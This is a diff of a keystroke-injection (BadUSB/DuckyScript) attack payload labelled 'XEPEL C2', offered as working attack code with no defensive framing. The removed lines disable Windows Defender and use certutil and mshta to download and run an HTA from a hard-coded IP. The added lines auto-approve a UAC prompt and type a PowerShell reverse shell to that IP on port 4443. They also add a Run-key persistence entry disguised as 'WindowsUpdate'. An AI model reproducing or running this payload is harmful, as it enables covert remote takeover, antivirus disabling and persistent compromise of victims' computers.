@@ -1,36 +1,46 @@
-REM XEPEL C2 – CLEANEST FINAL VERSION
-REM GUI d forces desktop focus every time
-REM CTRL+SHIFT+ESC opens Task Manager directly
-REM No browser interference possible
+REM XEPEL C2 – HID Reverse Shell + Persistence
+REM Windows 10/11 guaranteed admin execution
 
-DELAY 5000
-
-REM ── Step 1: Force desktop focus ──
-GUI d
-DELAY 1500
-
-REM ── Step 2: Open Task Manager directly ──
-CTRL+SHIFT+ESC
 DELAY 3000
 
-REM ── Step 3: Expand if in compact mode ──
-ALT+d
-DELAY 800
+REM ── Open Run dialog ──
+GUI r
+DELAY 1000
 
-REM ── Step 4: Open run dialog via File menu ──
-ALT+f
-DELAY 800
-STRING r
-DELAY 1500
-
-REM ── Step 5: Check create as administrator ──
-ALT+c
-DELAY 600
-
-REM ── Step 6: Kill Defender + fetch + execute ──
-STRING powershell -w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -MAPSReporting 0 -SubmitSamplesConsent 0; Add-MpPreference -ExclusionPath 'C:\'; Stop-Service WinDefend -Force; Set-Service WinDefend -StartupType Disabled; Stop-Process -Name MsMpEng -Force; certutil -urlcache -split -f http://153.75.82.198/s.hta C:\Windows\Temp\s.hta; mshta C:\Windows\Temp\s.hta"
+REM ── Type PowerShell command to request admin ──
+STRING powershell -Verb RunAs
 DELAY 500
-
-REM ── Step 7: Execute ──
 ENTER
 DELAY 2000
+
+REM ── UAC prompt: Yes button ──
+LEFTARROW
+DELAY 500
+ENTER
+DELAY 2000
+
+REM ── Now inside elevated PowerShell – type reverse shell code ──
+STRING $c=New-Object Net.Sockets.TCPClient('153.75.82.198',4443);
+ENTER
+DELAY 200
+STRING $s=$c.GetStream();
+ENTER
+DELAY 200
+STRING [byte[]]$b=0..65535|%{0};
+ENTER
+DELAY 200
+STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};
+ENTER
+DELAY 200
+STRING $c.Close()
+ENTER
+DELAY 1000
+
+REM ── Persistence code ──
+STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value "powershell -w hidden -ep bypass -c `"`$c=New-Object Net.Sockets.TCPClient('153.75.82.198',4443);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$rb=([text.encoding]::ASCII).GetBytes(`$r+'PS '+(pwd).Path+'> ');`$s.Write(`$rb,0,`$rb.Length);`$s.Flush()}`$c.Close()`""
+ENTER
+DELAY 500
+
+REM ── Close PowerShell ──
+STRING exit
+ENTER
